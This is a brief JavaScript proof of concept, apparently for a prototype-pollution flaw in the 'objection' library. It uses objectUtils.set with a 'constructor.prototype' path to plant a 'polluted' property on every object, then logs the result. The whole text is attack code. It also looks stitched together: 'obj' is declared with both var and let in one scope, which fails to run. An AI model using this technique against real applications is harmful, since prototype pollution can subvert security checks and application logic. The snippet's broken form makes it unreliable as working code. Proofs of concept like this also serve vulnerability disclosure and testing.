var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const objectUtils = require('objection/lib/utils/objectUtils');
console.log({}.polluted);
let obj = {};
objectUtils.set(obj, [
    'constructor.prototype',
    'polluted'
], 'yes');
console.log({}.polluted);